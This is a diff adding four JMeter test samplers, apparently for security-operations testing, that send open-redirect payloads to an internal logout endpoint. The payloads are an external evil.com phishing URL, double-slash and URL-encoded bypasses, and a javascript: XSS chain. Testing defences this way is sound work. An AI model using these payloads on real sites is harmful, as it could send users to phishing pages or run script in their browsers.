@@ -1,0 +1,102 @@
+<!-- Open Redirect 1: 외부 도메인 리다이렉트 -->
+<HTTPSamplerProxy guiclass="HttpTestSampleGui" testclass="HTTPSamplerProxy" testname="attack_open_redirect_external" enabled="true">
+  <stringProp name="HTTPSampler.domain">192.168.40.5</stringProp>
+  <stringProp name="HTTPSampler.port">80</stringProp>
+  <stringProp name="HTTPSampler.protocol">http</stringProp>
+  <stringProp name="HTTPSampler.path">/api/auth/logout</stringProp>
+  <boolProp name="HTTPSampler.follow_redirects">false</boolProp>  <!-- 리다이렉트 추적 안함 -->
+  <stringProp name="HTTPSampler.method">GET</stringProp>
+  <elementProp name="HTTPsampler.Arguments" elementType="Arguments">
+    <collectionProp name="Arguments.arguments">
+      <elementProp name="redirect" elementType="HTTPArgument">
+        <stringProp name="Argument.value">http://evil.com/phishing</stringProp>
+        <stringProp name="Argument.name">redirect</stringProp>
+      </elementProp>
+      <elementProp name="X-SOC-Test" elementType="HTTPArgument">
+        <stringProp name="Argument.value">true</stringProp>
+        <stringProp name="Argument.name">X-SOC-Test</stringProp>
+      </elementProp>
+    </collectionProp>
+  </elementProp>
+  <stringProp name="HTTPSampler.implementation">HttpClient4</stringProp>
+</HTTPSamplerProxy>
+<hashTree>
+  <HeaderManager guiclass="HeaderPanel" testclass="HeaderManager" testname="HTTP HeaderManager" enabled="true">
+    <collectionProp name="HeaderManager.headers">
+      <elementProp name="Authorization" elementType="Header">
+        <stringProp name="Header.name">Authorization</stringProp>
+        <stringProp name="Header.value">Bearer ${access_token}</stringProp>
+      </elementProp>
+    </collectionProp>
+  </HeaderManager>
+  <hashTree/>
+</hashTree>
+
+<!-- Open Redirect 2: 더블 슬래시 우회 -->
+<HTTPSamplerProxy guiclass="HttpTestSampleGui" testclass="HTTPSamplerProxy" testname="attack_open_redirect_double_slash" enabled="true">
+  <stringProp name="HTTPSampler.domain">192.168.40.5</stringProp>
+  <stringProp name="HTTPSampler.port">80</stringProp>
+  <stringProp name="HTTPSampler.protocol">http</stringProp>
+  <stringProp name="HTTPSampler.path">/api/auth/logout</stringProp>
+  <boolProp name="HTTPSampler.follow_redirects">false</boolProp>
+  <stringProp name="HTTPSampler.method">GET</stringProp>
+  <elementProp name="HTTPsampler.Arguments" elementType="Arguments">
+    <collectionProp name="Arguments.arguments">
+      <elementProp name="redirect" elementType="HTTPArgument">
+        <stringProp name="Argument.value">//evil.com</stringProp>
+        <stringProp name="Argument.name">redirect</stringProp>
+      </elementProp>
+      <elementProp name="X-SOC-Test" elementType="HTTPArgument">
+        <stringProp name="Argument.value">true</stringProp>
+        <stringProp name="Argument.name">X-SOC-Test</stringProp>
+      </elementProp>
+    </collectionProp>
+  </elementProp>
+  <stringProp name="HTTPSampler.implementation">HttpClient4</stringProp>
+</HTTPSamplerProxy>
+
+<!-- Open Redirect 3: URL 인코딩 우회 -->
+<HTTPSamplerProxy guiclass="HttpTestSampleGui" testclass="HTTPSamplerProxy" testname="attack_open_redirect_url_encoded" enabled="true">
+  <stringProp name="HTTPSampler.domain">192.168.40.5</stringProp>
+  <stringProp name="HTTPSampler.port">80</stringProp>
+  <stringProp name="HTTPSampler.protocol">http</stringProp>
+  <stringProp name="HTTPSampler.path">/api/auth/logout</stringProp>
+  <boolProp name="HTTPSampler.follow_redirects">false</boolProp>
+  <stringProp name="HTTPSampler.method">GET</stringProp>
+  <elementProp name="HTTPsampler.Arguments" elementType="Arguments">
+    <collectionProp name="Arguments.arguments">
+      <elementProp name="redirect" elementType="HTTPArgument">
+        <stringProp name="Argument.value">https%3A%2F%2Fevil.com%2F</stringProp>
+        <stringProp name="Argument.name">redirect</stringProp>
+      </elementProp>
+      <elementProp name="X-SOC-Test" elementType="HTTPArgument">
+        <stringProp name="Argument.value">true</stringProp>
+        <stringProp name="Argument.name">X-SOC-Test</stringProp>
+      </elementProp>
+    </collectionProp>
+  </elementProp>
+  <stringProp name="HTTPSampler.implementation">HttpClient4</stringProp>
+</HTTPSamplerProxy>
+
+<!-- Open Redirect 4: 자바스크립트 프로토콜 (XSS 연계) -->
+<HTTPSamplerProxy guiclass="HttpTestSampleGui" testclass="HTTPSamplerProxy" testname="attack_open_redirect_javascript" enabled="true">
+  <stringProp name="HTTPSampler.domain">192.168.40.5</stringProp>
+  <stringProp name="HTTPSampler.port">80</stringProp>
+  <stringProp name="HTTPSampler.protocol">http</stringProp>
+  <stringProp name="HTTPSampler.path">/api/auth/logout</stringProp>
+  <boolProp name="HTTPSampler.follow_redirects">false</boolProp>
+  <stringProp name="HTTPSampler.method">GET</stringProp>
+  <elementProp name="HTTPsampler.Arguments" elementType="Arguments">
+    <collectionProp name="Arguments.arguments">
+      <elementProp name="redirect" elementType="HTTPArgument">
+        <stringProp name="Argument.value">javascript:alert('SOC_OPEN_REDIRECT_XSS')</stringProp>
+        <stringProp name="Argument.name">redirect</stringProp>
+      </elementProp>
+      <elementProp name="X-SOC-Test" elementType="HTTPArgument">
+        <stringProp name="Argument.value">true</stringProp>
+        <stringProp name="Argument.name">X-SOC-Test</stringProp>
+      </elementProp>
+    </collectionProp>
+  </elementProp>
+  <stringProp name="HTTPSampler.implementation">HttpClient4</stringProp>
+</HTTPSamplerProxy>
